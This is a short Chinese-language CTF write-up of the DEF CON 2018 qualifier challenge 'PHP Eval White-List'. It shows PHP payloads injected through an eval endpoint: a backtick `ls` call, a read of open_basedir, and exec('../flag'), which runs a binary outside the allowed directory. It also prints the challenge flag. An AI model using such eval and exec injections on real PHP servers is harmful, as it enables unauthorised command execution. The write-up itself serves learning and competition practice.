# Defcon 2018
這是我第一次打defcon的初賽，雖然web的水準還是很高，但是感覺多了些出壞的題目:sweat:

# PHP Eval White-List
這道題目的頁面是在說，他們做了很厲害的`eval`白名單，除了extension，他們還有開啟`open_basedir`來避免我們去執行別的目錄下的`flag`。  
看到這邊我就起手研究如何繞過`open_basedir`囉～  
首先看看目錄下的檔案：  
```php
// eval()
echo `ls`;
```
網頁根目錄下有這些檔案：  
```
bootstrap.min.css
index.php
source.php
source.txt
tmp/
websec_eval_wl.so
```
再來是看看我們只能**訪問**哪個目錄：  
```php
echo ini_get('open_basedir')
```
回傳得到的是`/var/www/html`  
好，為啥說這道題目不太U呢，其實我最後根本沒試著繞過`open_basedir`，我最後在瞎試`echo exec('../flag')`時就成功了！  
這題的flag就是`OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}`
